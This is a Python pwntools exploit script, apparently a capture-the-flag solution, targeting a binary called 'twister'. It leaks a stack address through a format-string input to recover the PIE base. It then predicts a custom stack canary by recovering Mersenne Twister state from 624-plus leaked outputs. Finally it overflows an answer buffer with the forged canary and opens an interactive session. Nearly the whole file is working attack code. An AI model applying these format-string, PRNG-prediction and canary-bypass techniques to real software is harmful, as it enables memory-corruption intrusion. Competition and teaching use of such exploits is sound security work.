"""Main exploit script."""

from typing import Any, List

import pwn

# if using the custom impl
from mt19937 import MT19937

# if using the public library
# from mt19937predictor import MT19937Predictor


def start(argv: List[str] | None = None, *a: Any, **kw: Any) -> pwn.tube:
    """Start the exploit."""
    if argv is None:
        argv = []
    if len(argv) == 2 and argv[0].isdigit() and argv[1].isdigit():  # ('server', 'port')
        return pwn.remote(argv[0], argv[1], *a, **kw)
    else:
        return pwn.process([exe] + argv, *a, **kw)


exe = "./twister"
elf = pwn.context.binary = pwn.ELF(exe, checksec=False)
pwn.context.log_level = "warning"

p = start()

##### offsets

# size of the buffer that receives answers to the zetamac stuff
answer_buffer_size = 0xFF

# since answer_buffer isn't a whole multiple of 8, there is 1 extra byte
# between the word containing the canary and the end of the buffer
end_answer_buffer_padding = 0x1

# canary is a uint32_t
canary_buffer_padding = 0x4

# offset between the leaked stack value (*canary+419) and piebase
base_leaked_stack_offset = 0x157B

# from ropper
pop_rbp_offset = 0x1313

##### leak a value off of the stack and get piebase
##### use gdb to verify that this value is *canary+419, and that its offset
##### from piebase is base_leaked_stack_offset

p.sendlineafter(b"]:", b"c")
p.sendlineafter(b"(y/n) ", b"%x")
p.recvuntil(b"user input: ")

stack_value = p.recvline()[:-1]
piebase = int(stack_value, 16) - base_leaked_stack_offset

print(f"piebase: {hex(piebase)}")

##### get the mersenne twister state

twister_state = []
p.sendlineafter(b"please try again:", b"n")
p.sendlineafter(b"]:", b"c")
for _ in range(1000):  # any number of iterations >= 624 works
    p.recvuntil(b"canary_id: ")
    twister_state.append(int(p.recvline()[:-1]))
    p.sendlineafter(b"(y/n) ", b"y")

p.recvuntil(b"canary_id: ")
twister_state.append(int(p.recvline()[:-1]))
p.sendlineafter(b"(y/n) ", b"n")

##### get the canary
##### this uses a custom impl but can be done with
##### libraries like MT19937Predictor

predictor = MT19937()
canary = predictor.predict(twister_state[-624:])

# predictor = MT19937Predictor()
# for state in twister_state:
#     predictor.setrandbits(state, 32)
# canary = predictor.getrandbits(32)

print("canary", hex(canary))

##### play the game and overflow the buffer

p.sendlineafter(b"]:", b"p")

for i in range(10):
    p.recvuntil(b". ")
    question = p.recvuntil(b":")[:-1].decode("utf-8")
    num1, num2 = map(int, question.split("+"))
    ans = num1 + num2

    encoded_ans = str(ans).encode()

    if i == 9:
        padding = b"A" * (
            answer_buffer_size
            + end_answer_buffer_padding
            - len(encoded_ans)
            - 1
            + canary_buffer_padding
        )
        canary_bytes = canary.to_bytes(4, byteorder="little")
        payload = encoded_ans + b"\x00" + padding + canary_bytes + b"A" * 10
        p.sendline(payload)
    else:
        p.sendline(encoded_ans)

p.sendlineafter(b"(y/n) ", b"n")
p.interactive()

p.close()
